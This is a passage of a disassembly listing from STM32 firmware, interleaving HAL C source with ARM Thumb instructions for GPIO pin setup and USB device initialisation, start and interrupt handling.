          temp |= iocurrent;
 8001c06:	693a      	ldr	r2, [r7, #16]
 8001c08:	68fb      	ldr	r3, [r7, #12]
 8001c0a:	4313      	orrs	r3, r2
 8001c0c:	613b      	str	r3, [r7, #16]
        }
        EXTI->IMR1 = temp;
 8001c0e:	4a0e      	ldr	r2, [pc, #56]	; (8001c48 <HAL_GPIO_Init+0x2d0>)
 8001c10:	693b      	ldr	r3, [r7, #16]
 8001c12:	6013      	str	r3, [r2, #0]
      }
    }

    position++;
 8001c14:	697b      	ldr	r3, [r7, #20]
 8001c16:	3301      	adds	r3, #1
 8001c18:	617b      	str	r3, [r7, #20]
  while (((GPIO_Init->Pin) >> position) != 0x00u)
 8001c1a:	683b      	ldr	r3, [r7, #0]
 8001c1c:	681a      	ldr	r2, [r3, #0]
 8001c1e:	697b      	ldr	r3, [r7, #20]
 8001c20:	fa22 f303 	lsr.w	r3, r2, r3
 8001c24:	2b00      	cmp	r3, #0
 8001c26:	f47f aeaf 	bne.w	8001988 <HAL_GPIO_Init+0x10>
  }
}
 8001c2a:	bf00      	nop
 8001c2c:	bf00      	nop
 8001c2e:	371c      	adds	r7, #28
 8001c30:	46bd      	mov	sp, r7
 8001c32:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001c36:	4770      	bx	lr
 8001c38:	40021000 	.word	0x40021000
 8001c3c:	40010000 	.word	0x40010000
 8001c40:	48000400 	.word	0x48000400
 8001c44:	48000800 	.word	0x48000800
 8001c48:	40010400 	.word	0x40010400

08001c4c <HAL_GPIO_WritePin>:
  *            @arg GPIO_PIN_RESET: to clear the port pin
  *            @arg GPIO_PIN_SET: to set the port pin
  * @retval None
  */
void HAL_GPIO_WritePin(GPIO_TypeDef* GPIOx, uint16_t GPIO_Pin, GPIO_PinState PinState)
{
 8001c4c:	b480      	push	{r7}
 8001c4e:	b083      	sub	sp, #12
 8001c50:	af00      	add	r7, sp, #0
 8001c52:	6078      	str	r0, [r7, #4]
 8001c54:	460b      	mov	r3, r1
 8001c56:	807b      	strh	r3, [r7, #2]
 8001c58:	4613      	mov	r3, r2
 8001c5a:	707b      	strb	r3, [r7, #1]
  /* Check the parameters */
  assert_param(IS_GPIO_PIN(GPIO_Pin));
  assert_param(IS_GPIO_PIN_ACTION(PinState));

  if(PinState != GPIO_PIN_RESET)
 8001c5c:	787b      	ldrb	r3, [r7, #1]
 8001c5e:	2b00      	cmp	r3, #0
 8001c60:	d003      	beq.n	8001c6a <HAL_GPIO_WritePin+0x1e>
  {
    GPIOx->BSRR = (uint32_t)GPIO_Pin;
 8001c62:	887a      	ldrh	r2, [r7, #2]
 8001c64:	687b      	ldr	r3, [r7, #4]
 8001c66:	619a      	str	r2, [r3, #24]
  }
  else
  {
    GPIOx->BRR = (uint32_t)GPIO_Pin;
  }
}
 8001c68:	e002      	b.n	8001c70 <HAL_GPIO_WritePin+0x24>
    GPIOx->BRR = (uint32_t)GPIO_Pin;
 8001c6a:	887a      	ldrh	r2, [r7, #2]
 8001c6c:	687b      	ldr	r3, [r7, #4]
 8001c6e:	629a      	str	r2, [r3, #40]	; 0x28
}
 8001c70:	bf00      	nop
 8001c72:	370c      	adds	r7, #12
 8001c74:	46bd      	mov	sp, r7
 8001c76:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001c7a:	4770      	bx	lr

08001c7c <HAL_PCD_Init>:
  *         parameters in the PCD_InitTypeDef and initialize the associated handle.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_Init(PCD_HandleTypeDef *hpcd)
{
 8001c7c:	b5f0      	push	{r4, r5, r6, r7, lr}
 8001c7e:	b08b      	sub	sp, #44	; 0x2c
 8001c80:	af06      	add	r7, sp, #24
 8001c82:	6078      	str	r0, [r7, #4]
  USB_OTG_GlobalTypeDef *USBx;
#endif /* defined (USB_OTG_FS) */
  uint8_t i;

  /* Check the PCD handle allocation */
  if (hpcd == NULL)
 8001c84:	687b      	ldr	r3, [r7, #4]
 8001c86:	2b00      	cmp	r3, #0
 8001c88:	d101      	bne.n	8001c8e <HAL_PCD_Init+0x12>
  {
    return HAL_ERROR;
 8001c8a:	2301      	movs	r3, #1
 8001c8c:	e0f8      	b.n	8001e80 <HAL_PCD_Init+0x204>

#if defined (USB_OTG_FS)
  USBx = hpcd->Instance;
#endif /* defined (USB_OTG_FS) */

  if (hpcd->State == HAL_PCD_STATE_RESET)
 8001c8e:	687b      	ldr	r3, [r7, #4]
 8001c90:	f893 32a9 	ldrb.w	r3, [r3, #681]	; 0x2a9
 8001c94:	b2db      	uxtb	r3, r3
 8001c96:	2b00      	cmp	r3, #0
 8001c98:	d106      	bne.n	8001ca8 <HAL_PCD_Init+0x2c>
  {
    /* Allocate lock resource and initialize it */
    hpcd->Lock = HAL_UNLOCKED;
 8001c9a:	687b      	ldr	r3, [r7, #4]
 8001c9c:	2200      	movs	r2, #0
 8001c9e:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

    /* Init the low level hardware */
    hpcd->MspInitCallback(hpcd);
#else
    /* Init the low level hardware : GPIO, CLOCK, NVIC... */
    HAL_PCD_MspInit(hpcd);
 8001ca2:	6878      	ldr	r0, [r7, #4]
 8001ca4:	f00a fde4 	bl	800c870 <HAL_PCD_MspInit>
#endif /* (USE_HAL_PCD_REGISTER_CALLBACKS) */
  }

  hpcd->State = HAL_PCD_STATE_BUSY;
 8001ca8:	687b      	ldr	r3, [r7, #4]
 8001caa:	2203      	movs	r2, #3
 8001cac:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9
    hpcd->Init.dma_enable = 0U;
  }
#endif /* defined (USB_OTG_FS) */

  /* Disable the Interrupts */
  __HAL_PCD_DISABLE(hpcd);
 8001cb0:	687b      	ldr	r3, [r7, #4]
 8001cb2:	681b      	ldr	r3, [r3, #0]
 8001cb4:	4618      	mov	r0, r3
 8001cb6:	f004 f8d4 	bl	8005e62 <USB_DisableGlobalInt>

  /*Init the Core (common init.) */
  if (USB_CoreInit(hpcd->Instance, hpcd->Init) != HAL_OK)
 8001cba:	687b      	ldr	r3, [r7, #4]
 8001cbc:	681b      	ldr	r3, [r3, #0]
 8001cbe:	603b      	str	r3, [r7, #0]
 8001cc0:	687e      	ldr	r6, [r7, #4]
 8001cc2:	466d      	mov	r5, sp
 8001cc4:	f106 0410 	add.w	r4, r6, #16
 8001cc8:	cc0f      	ldmia	r4!, {r0, r1, r2, r3}
 8001cca:	c50f      	stmia	r5!, {r0, r1, r2, r3}
 8001ccc:	6823      	ldr	r3, [r4, #0]
 8001cce:	602b      	str	r3, [r5, #0]
 8001cd0:	1d33      	adds	r3, r6, #4
 8001cd2:	cb0e      	ldmia	r3, {r1, r2, r3}
 8001cd4:	6838      	ldr	r0, [r7, #0]
 8001cd6:	f004 f89c 	bl	8005e12 <USB_CoreInit>
 8001cda:	4603      	mov	r3, r0
 8001cdc:	2b00      	cmp	r3, #0
 8001cde:	d005      	beq.n	8001cec <HAL_PCD_Init+0x70>
  {
    hpcd->State = HAL_PCD_STATE_ERROR;
 8001ce0:	687b      	ldr	r3, [r7, #4]
 8001ce2:	2202      	movs	r2, #2
 8001ce4:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9
    return HAL_ERROR;
 8001ce8:	2301      	movs	r3, #1
 8001cea:	e0c9      	b.n	8001e80 <HAL_PCD_Init+0x204>
  }

  /* Force Device Mode*/
  (void)USB_SetCurrentMode(hpcd->Instance, USB_DEVICE_MODE);
 8001cec:	687b      	ldr	r3, [r7, #4]
 8001cee:	681b      	ldr	r3, [r3, #0]
 8001cf0:	2100      	movs	r1, #0
 8001cf2:	4618      	mov	r0, r3
 8001cf4:	f004 f8d0 	bl	8005e98 <USB_SetCurrentMode>

  /* Init endpoints structures */
  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001cf8:	2300      	movs	r3, #0
 8001cfa:	73fb      	strb	r3, [r7, #15]
 8001cfc:	e040      	b.n	8001d80 <HAL_PCD_Init+0x104>
  {
    /* Init ep structure */
    hpcd->IN_ep[i].is_in = 1U;
 8001cfe:	7bfb      	ldrb	r3, [r7, #15]
 8001d00:	6879      	ldr	r1, [r7, #4]
 8001d02:	1c5a      	adds	r2, r3, #1
 8001d04:	4613      	mov	r3, r2
 8001d06:	009b      	lsls	r3, r3, #2
 8001d08:	4413      	add	r3, r2
 8001d0a:	00db      	lsls	r3, r3, #3
 8001d0c:	440b      	add	r3, r1
 8001d0e:	3301      	adds	r3, #1
 8001d10:	2201      	movs	r2, #1
 8001d12:	701a      	strb	r2, [r3, #0]
    hpcd->IN_ep[i].num = i;
 8001d14:	7bfb      	ldrb	r3, [r7, #15]
 8001d16:	6879      	ldr	r1, [r7, #4]
 8001d18:	1c5a      	adds	r2, r3, #1
 8001d1a:	4613      	mov	r3, r2
 8001d1c:	009b      	lsls	r3, r3, #2
 8001d1e:	4413      	add	r3, r2
 8001d20:	00db      	lsls	r3, r3, #3
 8001d22:	440b      	add	r3, r1
 8001d24:	7bfa      	ldrb	r2, [r7, #15]
 8001d26:	701a      	strb	r2, [r3, #0]
#if defined (USB_OTG_FS)
    hpcd->IN_ep[i].tx_fifo_num = i;
#endif /* defined (USB_OTG_FS) */
    /* Control until ep is activated */
    hpcd->IN_ep[i].type = EP_TYPE_CTRL;
 8001d28:	7bfb      	ldrb	r3, [r7, #15]
 8001d2a:	6879      	ldr	r1, [r7, #4]
 8001d2c:	1c5a      	adds	r2, r3, #1
 8001d2e:	4613      	mov	r3, r2
 8001d30:	009b      	lsls	r3, r3, #2
 8001d32:	4413      	add	r3, r2
 8001d34:	00db      	lsls	r3, r3, #3
 8001d36:	440b      	add	r3, r1
 8001d38:	3303      	adds	r3, #3
 8001d3a:	2200      	movs	r2, #0
 8001d3c:	701a      	strb	r2, [r3, #0]
    hpcd->IN_ep[i].maxpacket = 0U;
 8001d3e:	7bfa      	ldrb	r2, [r7, #15]
 8001d40:	6879      	ldr	r1, [r7, #4]
 8001d42:	4613      	mov	r3, r2
 8001d44:	009b      	lsls	r3, r3, #2
 8001d46:	4413      	add	r3, r2
 8001d48:	00db      	lsls	r3, r3, #3
 8001d4a:	440b      	add	r3, r1
 8001d4c:	3338      	adds	r3, #56	; 0x38
 8001d4e:	2200      	movs	r2, #0
 8001d50:	601a      	str	r2, [r3, #0]
    hpcd->IN_ep[i].xfer_buff = 0U;
 8001d52:	7bfa      	ldrb	r2, [r7, #15]
 8001d54:	6879      	ldr	r1, [r7, #4]
 8001d56:	4613      	mov	r3, r2
 8001d58:	009b      	lsls	r3, r3, #2
 8001d5a:	4413      	add	r3, r2
 8001d5c:	00db      	lsls	r3, r3, #3
 8001d5e:	440b      	add	r3, r1
 8001d60:	333c      	adds	r3, #60	; 0x3c
 8001d62:	2200      	movs	r2, #0
 8001d64:	601a      	str	r2, [r3, #0]
    hpcd->IN_ep[i].xfer_len = 0U;
 8001d66:	7bfa      	ldrb	r2, [r7, #15]
 8001d68:	6879      	ldr	r1, [r7, #4]
 8001d6a:	4613      	mov	r3, r2
 8001d6c:	009b      	lsls	r3, r3, #2
 8001d6e:	4413      	add	r3, r2
 8001d70:	00db      	lsls	r3, r3, #3
 8001d72:	440b      	add	r3, r1
 8001d74:	3340      	adds	r3, #64	; 0x40
 8001d76:	2200      	movs	r2, #0
 8001d78:	601a      	str	r2, [r3, #0]
  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001d7a:	7bfb      	ldrb	r3, [r7, #15]
 8001d7c:	3301      	adds	r3, #1
 8001d7e:	73fb      	strb	r3, [r7, #15]
 8001d80:	7bfa      	ldrb	r2, [r7, #15]
 8001d82:	687b      	ldr	r3, [r7, #4]
 8001d84:	685b      	ldr	r3, [r3, #4]
 8001d86:	429a      	cmp	r2, r3
 8001d88:	d3b9      	bcc.n	8001cfe <HAL_PCD_Init+0x82>
  }

  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001d8a:	2300      	movs	r3, #0
 8001d8c:	73fb      	strb	r3, [r7, #15]
 8001d8e:	e044      	b.n	8001e1a <HAL_PCD_Init+0x19e>
  {
    hpcd->OUT_ep[i].is_in = 0U;
 8001d90:	7bfa      	ldrb	r2, [r7, #15]
 8001d92:	6879      	ldr	r1, [r7, #4]
 8001d94:	4613      	mov	r3, r2
 8001d96:	009b      	lsls	r3, r3, #2
 8001d98:	4413      	add	r3, r2
 8001d9a:	00db      	lsls	r3, r3, #3
 8001d9c:	440b      	add	r3, r1
 8001d9e:	f203 1369 	addw	r3, r3, #361	; 0x169
 8001da2:	2200      	movs	r2, #0
 8001da4:	701a      	strb	r2, [r3, #0]
    hpcd->OUT_ep[i].num = i;
 8001da6:	7bfa      	ldrb	r2, [r7, #15]
 8001da8:	6879      	ldr	r1, [r7, #4]
 8001daa:	4613      	mov	r3, r2
 8001dac:	009b      	lsls	r3, r3, #2
 8001dae:	4413      	add	r3, r2
 8001db0:	00db      	lsls	r3, r3, #3
 8001db2:	440b      	add	r3, r1
 8001db4:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8001db8:	7bfa      	ldrb	r2, [r7, #15]
 8001dba:	701a      	strb	r2, [r3, #0]
    /* Control until ep is activated */
    hpcd->OUT_ep[i].type = EP_TYPE_CTRL;
 8001dbc:	7bfa      	ldrb	r2, [r7, #15]
 8001dbe:	6879      	ldr	r1, [r7, #4]
 8001dc0:	4613      	mov	r3, r2
 8001dc2:	009b      	lsls	r3, r3, #2
 8001dc4:	4413      	add	r3, r2
 8001dc6:	00db      	lsls	r3, r3, #3
 8001dc8:	440b      	add	r3, r1
 8001dca:	f203 136b 	addw	r3, r3, #363	; 0x16b
 8001dce:	2200      	movs	r2, #0
 8001dd0:	701a      	strb	r2, [r3, #0]
    hpcd->OUT_ep[i].maxpacket = 0U;
 8001dd2:	7bfa      	ldrb	r2, [r7, #15]
 8001dd4:	6879      	ldr	r1, [r7, #4]
 8001dd6:	4613      	mov	r3, r2
 8001dd8:	009b      	lsls	r3, r3, #2
 8001dda:	4413      	add	r3, r2
 8001ddc:	00db      	lsls	r3, r3, #3
 8001dde:	440b      	add	r3, r1
 8001de0:	f503 73bc 	add.w	r3, r3, #376	; 0x178
 8001de4:	2200      	movs	r2, #0
 8001de6:	601a      	str	r2, [r3, #0]
    hpcd->OUT_ep[i].xfer_buff = 0U;
 8001de8:	7bfa      	ldrb	r2, [r7, #15]
 8001dea:	6879      	ldr	r1, [r7, #4]
 8001dec:	4613      	mov	r3, r2
 8001dee:	009b      	lsls	r3, r3, #2
 8001df0:	4413      	add	r3, r2
 8001df2:	00db      	lsls	r3, r3, #3
 8001df4:	440b      	add	r3, r1
 8001df6:	f503 73be 	add.w	r3, r3, #380	; 0x17c
 8001dfa:	2200      	movs	r2, #0
 8001dfc:	601a      	str	r2, [r3, #0]
    hpcd->OUT_ep[i].xfer_len = 0U;
 8001dfe:	7bfa      	ldrb	r2, [r7, #15]
 8001e00:	6879      	ldr	r1, [r7, #4]
 8001e02:	4613      	mov	r3, r2
 8001e04:	009b      	lsls	r3, r3, #2
 8001e06:	4413      	add	r3, r2
 8001e08:	00db      	lsls	r3, r3, #3
 8001e0a:	440b      	add	r3, r1
 8001e0c:	f503 73c0 	add.w	r3, r3, #384	; 0x180
 8001e10:	2200      	movs	r2, #0
 8001e12:	601a      	str	r2, [r3, #0]
  for (i = 0U; i < hpcd->Init.dev_endpoints; i++)
 8001e14:	7bfb      	ldrb	r3, [r7, #15]
 8001e16:	3301      	adds	r3, #1
 8001e18:	73fb      	strb	r3, [r7, #15]
 8001e1a:	7bfa      	ldrb	r2, [r7, #15]
 8001e1c:	687b      	ldr	r3, [r7, #4]
 8001e1e:	685b      	ldr	r3, [r3, #4]
 8001e20:	429a      	cmp	r2, r3
 8001e22:	d3b5      	bcc.n	8001d90 <HAL_PCD_Init+0x114>
  }

  /* Init Device */
  if (USB_DevInit(hpcd->Instance, hpcd->Init) != HAL_OK)
 8001e24:	687b      	ldr	r3, [r7, #4]
 8001e26:	681b      	ldr	r3, [r3, #0]
 8001e28:	603b      	str	r3, [r7, #0]
 8001e2a:	687e      	ldr	r6, [r7, #4]
 8001e2c:	466d      	mov	r5, sp
 8001e2e:	f106 0410 	add.w	r4, r6, #16
 8001e32:	cc0f      	ldmia	r4!, {r0, r1, r2, r3}
 8001e34:	c50f      	stmia	r5!, {r0, r1, r2, r3}
 8001e36:	6823      	ldr	r3, [r4, #0]
 8001e38:	602b      	str	r3, [r5, #0]
 8001e3a:	1d33      	adds	r3, r6, #4
 8001e3c:	cb0e      	ldmia	r3, {r1, r2, r3}
 8001e3e:	6838      	ldr	r0, [r7, #0]
 8001e40:	f004 f837 	bl	8005eb2 <USB_DevInit>
 8001e44:	4603      	mov	r3, r0
 8001e46:	2b00      	cmp	r3, #0
 8001e48:	d005      	beq.n	8001e56 <HAL_PCD_Init+0x1da>
  {
    hpcd->State = HAL_PCD_STATE_ERROR;
 8001e4a:	687b      	ldr	r3, [r7, #4]
 8001e4c:	2202      	movs	r2, #2
 8001e4e:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9
    return HAL_ERROR;
 8001e52:	2301      	movs	r3, #1
 8001e54:	e014      	b.n	8001e80 <HAL_PCD_Init+0x204>
  }

  hpcd->USB_Address = 0U;
 8001e56:	687b      	ldr	r3, [r7, #4]
 8001e58:	2200      	movs	r2, #0
 8001e5a:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
  hpcd->State = HAL_PCD_STATE_READY;
 8001e5e:	687b      	ldr	r3, [r7, #4]
 8001e60:	2201      	movs	r2, #1
 8001e62:	f883 22a9 	strb.w	r2, [r3, #681]	; 0x2a9

  /* Activate LPM */
  if (hpcd->Init.lpm_enable == 1U)
 8001e66:	687b      	ldr	r3, [r7, #4]
 8001e68:	69db      	ldr	r3, [r3, #28]
 8001e6a:	2b01      	cmp	r3, #1
 8001e6c:	d102      	bne.n	8001e74 <HAL_PCD_Init+0x1f8>
  {
    (void)HAL_PCDEx_ActivateLPM(hpcd);
 8001e6e:	6878      	ldr	r0, [r7, #4]
 8001e70:	f001 fc9e 	bl	80037b0 <HAL_PCDEx_ActivateLPM>
  }

  (void)USB_DevDisconnect(hpcd->Instance);
 8001e74:	687b      	ldr	r3, [r7, #4]
 8001e76:	681b      	ldr	r3, [r3, #0]
 8001e78:	4618      	mov	r0, r3
 8001e7a:	f006 fadf 	bl	800843c <USB_DevDisconnect>

  return HAL_OK;
 8001e7e:	2300      	movs	r3, #0
}
 8001e80:	4618      	mov	r0, r3
 8001e82:	3714      	adds	r7, #20
 8001e84:	46bd      	mov	sp, r7
 8001e86:	bdf0      	pop	{r4, r5, r6, r7, pc}

08001e88 <HAL_PCD_Start>:
  * @brief  Start the USB device
  * @param  hpcd PCD handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_Start(PCD_HandleTypeDef *hpcd)
{
 8001e88:	b580      	push	{r7, lr}
 8001e8a:	b082      	sub	sp, #8
 8001e8c:	af00      	add	r7, sp, #0
 8001e8e:	6078      	str	r0, [r7, #4]
#if defined (USB_OTG_FS)
  USB_OTG_GlobalTypeDef *USBx = hpcd->Instance;
#endif /* defined (USB_OTG_FS) */

  __HAL_LOCK(hpcd);
 8001e90:	687b      	ldr	r3, [r7, #4]
 8001e92:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 8001e96:	2b01      	cmp	r3, #1
 8001e98:	d101      	bne.n	8001e9e <HAL_PCD_Start+0x16>
 8001e9a:	2302      	movs	r3, #2
 8001e9c:	e012      	b.n	8001ec4 <HAL_PCD_Start+0x3c>
 8001e9e:	687b      	ldr	r3, [r7, #4]
 8001ea0:	2201      	movs	r2, #1
 8001ea2:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  {
    /* Enable USB Transceiver */
    USBx->GCCFG |= USB_OTG_GCCFG_PWRDWN;
  }
#endif /* defined (USB_OTG_FS) */
  __HAL_PCD_ENABLE(hpcd);
 8001ea6:	687b      	ldr	r3, [r7, #4]
 8001ea8:	681b      	ldr	r3, [r3, #0]
 8001eaa:	4618      	mov	r0, r3
 8001eac:	f003 ffc2 	bl	8005e34 <USB_EnableGlobalInt>
  (void)USB_DevConnect(hpcd->Instance);
 8001eb0:	687b      	ldr	r3, [r7, #4]
 8001eb2:	681b      	ldr	r3, [r3, #0]
 8001eb4:	4618      	mov	r0, r3
 8001eb6:	f006 faaa 	bl	800840e <USB_DevConnect>
  __HAL_UNLOCK(hpcd);
 8001eba:	687b      	ldr	r3, [r7, #4]
 8001ebc:	2200      	movs	r2, #0
 8001ebe:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 8001ec2:	2300      	movs	r3, #0
}
 8001ec4:	4618      	mov	r0, r3
 8001ec6:	3708      	adds	r7, #8
 8001ec8:	46bd      	mov	sp, r7
 8001eca:	bd80      	pop	{r7, pc}

08001ecc <HAL_PCD_IRQHandler>:
  * @brief  This function handles PCD interrupt request.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
void HAL_PCD_IRQHandler(PCD_HandleTypeDef *hpcd)
{
 8001ecc:	b580      	push	{r7, lr}
 8001ece:	b084      	sub	sp, #16
 8001ed0:	af00      	add	r7, sp, #0
 8001ed2:	6078      	str	r0, [r7, #4]
  uint32_t wIstr = USB_ReadInterrupts(hpcd->Instance);
 8001ed4:	687b      	ldr	r3, [r7, #4]
 8001ed6:	681b      	ldr	r3, [r3, #0]
 8001ed8:	4618      	mov	r0, r3
 8001eda:	f006 fac4 	bl	8008466 <USB_ReadInterrupts>
 8001ede:	60f8      	str	r0, [r7, #12]

  if ((wIstr & USB_ISTR_CTR) == USB_ISTR_CTR)
 8001ee0:	68fb      	ldr	r3, [r7, #12]
 8001ee2:	f403 4300 	and.w	r3, r3, #32768	; 0x8000
 8001ee6:	2b00      	cmp	r3, #0
 8001ee8:	d003      	beq.n	8001ef2 <HAL_PCD_IRQHandler+0x26>
  {
    /* servicing of the endpoint correct transfer interrupt */
    /* clear of the CTR flag into the sub */
    (void)PCD_EP_ISR_Handler(hpcd);
 8001eea:	6878      	ldr	r0, [r7, #4]
 8001eec:	f000 fb59 	bl	80025a2 <PCD_EP_ISR_Handler>

    return;
 8001ef0:	e110      	b.n	8002114 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_RESET) == USB_ISTR_RESET)
 8001ef2:	68fb      	ldr	r3, [r7, #12]
 8001ef4:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8001ef8:	2b00      	cmp	r3, #0
 8001efa:	d013      	beq.n	8001f24 <HAL_PCD_IRQHandler+0x58>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_RESET);
 8001efc:	687b      	ldr	r3, [r7, #4]
 8001efe:	681b      	ldr	r3, [r3, #0]
 8001f00:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8001f04:	b29a      	uxth	r2, r3
 8001f06:	687b      	ldr	r3, [r7, #4]
 8001f08:	681b      	ldr	r3, [r3, #0]
 8001f0a:	f422 6280 	bic.w	r2, r2, #1024	; 0x400
 8001f0e:	b292      	uxth	r2, r2
 8001f10:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->ResetCallback(hpcd);
#else
    HAL_PCD_ResetCallback(hpcd);
 8001f14:	6878      	ldr	r0, [r7, #4]
 8001f16:	f00a fd4c 	bl	800c9b2 <HAL_PCD_ResetCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    (void)HAL_PCD_SetAddress(hpcd, 0U);
 8001f1a:	2100      	movs	r1, #0
 8001f1c:	6878      	ldr	r0, [r7, #4]
 8001f1e:	f000 f8fc 	bl	800211a <HAL_PCD_SetAddress>

    return;
 8001f22:	e0f7      	b.n	8002114 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_PMAOVR) == USB_ISTR_PMAOVR)
 8001f24:	68fb      	ldr	r3, [r7, #12]
 8001f26:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8001f2a:	2b00      	cmp	r3, #0
 8001f2c:	d00c      	beq.n	8001f48 <HAL_PCD_IRQHandler+0x7c>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_PMAOVR);
 8001f2e:	687b      	ldr	r3, [r7, #4]
 8001f30:	681b      	ldr	r3, [r3, #0]
 8001f32:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8001f36:	b29a      	uxth	r2, r3
 8001f38:	687b      	ldr	r3, [r7, #4]
 8001f3a:	681b      	ldr	r3, [r3, #0]
 8001f3c:	f422 4280 	bic.w	r2, r2, #16384	; 0x4000
 8001f40:	b292      	uxth	r2, r2
 8001f42:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 8001f46:	e0e5      	b.n	8002114 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_ERR) == USB_ISTR_ERR)
 8001f48:	68fb      	ldr	r3, [r7, #12]
 8001f4a:	f403 5300 	and.w	r3, r3, #8192	; 0x2000
 8001f4e:	2b00      	cmp	r3, #0
 8001f50:	d00c      	beq.n	8001f6c <HAL_PCD_IRQHandler+0xa0>
  {
    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_ERR);
 8001f52:	687b      	ldr	r3, [r7, #4]
 8001f54:	681b      	ldr	r3, [r3, #0]
 8001f56:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8001f5a:	b29a      	uxth	r2, r3
 8001f5c:	687b      	ldr	r3, [r7, #4]
 8001f5e:	681b      	ldr	r3, [r3, #0]
 8001f60:	f422 5200 	bic.w	r2, r2, #8192	; 0x2000
 8001f64:	b292      	uxth	r2, r2
 8001f66:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 8001f6a:	e0d3      	b.n	8002114 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_WKUP) == USB_ISTR_WKUP)
 8001f6c:	68fb      	ldr	r3, [r7, #12]
 8001f6e:	f403 5380 	and.w	r3, r3, #4096	; 0x1000
 8001f72:	2b00      	cmp	r3, #0
 8001f74:	d034      	beq.n	8001fe0 <HAL_PCD_IRQHandler+0x114>
  {
    hpcd->Instance->CNTR &= (uint16_t) ~(USB_CNTR_LPMODE);
 8001f76:	687b      	ldr	r3, [r7, #4]
 8001f78:	681b      	ldr	r3, [r3, #0]
 8001f7a:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8001f7e:	b29a      	uxth	r2, r3
 8001f80:	687b      	ldr	r3, [r7, #4]
 8001f82:	681b      	ldr	r3, [r3, #0]
 8001f84:	f022 0204 	bic.w	r2, r2, #4
 8001f88:	b292      	uxth	r2, r2
 8001f8a:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40
    hpcd->Instance->CNTR &= (uint16_t) ~(USB_CNTR_FSUSP);
 8001f8e:	687b      	ldr	r3, [r7, #4]
 8001f90:	681b      	ldr	r3, [r3, #0]
 8001f92:	f8b3 3040 	ldrh.w	r3, [r3, #64]	; 0x40
 8001f96:	b29a      	uxth	r2, r3
 8001f98:	687b      	ldr	r3, [r7, #4]
 8001f9a:	681b      	ldr	r3, [r3, #0]
 8001f9c:	f022 0208 	bic.w	r2, r2, #8
 8001fa0:	b292      	uxth	r2, r2
 8001fa2:	f8a3 2040 	strh.w	r2, [r3, #64]	; 0x40

    if (hpcd->LPM_State == LPM_L1)
 8001fa6:	687b      	ldr	r3, [r7, #4]
 8001fa8:	f893 32e0 	ldrb.w	r3, [r3, #736]	; 0x2e0
 8001fac:	2b01      	cmp	r3, #1
 8001fae:	d107      	bne.n	8001fc0 <HAL_PCD_IRQHandler+0xf4>
    {
      hpcd->LPM_State = LPM_L0;
 8001fb0:	687b      	ldr	r3, [r7, #4]
 8001fb2:	2200      	movs	r2, #0
 8001fb4:	f883 22e0 	strb.w	r2, [r3, #736]	; 0x2e0
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->LPMCallback(hpcd, PCD_LPM_L0_ACTIVE);
#else
      HAL_PCDEx_LPM_Callback(hpcd, PCD_LPM_L0_ACTIVE);
 8001fb8:	2100      	movs	r1, #0
 8001fba:	6878      	ldr	r0, [r7, #4]
 8001fbc:	f00a ffd6 	bl	800cf6c <HAL_PCDEx_LPM_Callback>
    }

#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
    hpcd->ResumeCallback(hpcd);
#else
    HAL_PCD_ResumeCallback(hpcd);
 8001fc0:	6878      	ldr	r0, [r7, #4]
 8001fc2:	f00a fd2f 	bl	800ca24 <HAL_PCD_ResumeCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

    __HAL_PCD_CLEAR_FLAG(hpcd, USB_ISTR_WKUP);
 8001fc6:	687b      	ldr	r3, [r7, #4]
 8001fc8:	681b      	ldr	r3, [r3, #0]
 8001fca:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8001fce:	b29a      	uxth	r2, r3
 8001fd0:	687b      	ldr	r3, [r7, #4]
 8001fd2:	681b      	ldr	r3, [r3, #0]
 8001fd4:	f422 5280 	bic.w	r2, r2, #4096	; 0x1000
 8001fd8:	b292      	uxth	r2, r2
 8001fda:	f8a3 2044 	strh.w	r2, [r3, #68]	; 0x44

    return;
 8001fde:	e099      	b.n	8002114 <HAL_PCD_IRQHandler+0x248>
  }

  if ((wIstr & USB_ISTR_SUSP) == USB_ISTR_SUSP)
 8001fe0:	68fb      	ldr	r3, [r7, #12]
 8001fe2:	f403 6300 	and.w	r3, r3, #2048	; 0x800
